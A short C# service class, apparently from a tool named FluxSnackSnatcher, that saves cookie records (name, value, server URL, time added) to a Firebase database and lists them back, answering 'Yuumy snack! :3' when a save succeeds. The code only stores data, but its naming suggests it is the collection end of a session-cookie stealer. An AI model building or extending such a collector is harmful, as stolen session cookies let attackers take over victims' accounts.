using Firebase.Database;
using Firebase.Database.Query;
using FluxSnackSnatcher.Models;

namespace FluxSnackSnatcher.Services
{
    public class FirebaseService : IFirebaseService
    {
        private readonly FirebaseClient _firebaseClient;

        public FirebaseService(FirebaseClient firebaseClient)
        {
            _firebaseClient = firebaseClient;
        }

        public async Task<string> SetCookie(CookieData cookie)
        {
            try
            {
                await _firebaseClient
                   .Child("cookies")
                   .Child(cookie.ServerUrl)
                   .PutAsync(cookie);

                return $"Yuumy snack! :3";
            }
            catch (Exception ex)
            {
                return ex.Message;
            }
        }

        public async Task<List<CookieData>> GetCookies()
        {
            try
            {
                var cookies = await _firebaseClient
                    .Child("cookies")
                    .OnceAsync<CookieData>();

                return cookies.Select(item => new CookieData
                {
                    Name = item.Object.Name,
                    Value = item.Object.Value,
                    AddedAt = item.Object.AddedAt,
                    ServerUrl = item.Object.ServerUrl
                }).ToList();
            }
            catch (Exception ex)
            {
                throw new Exception($"Erro ao obter cookies: {ex.Message}", ex);
            }
        }
    }
}
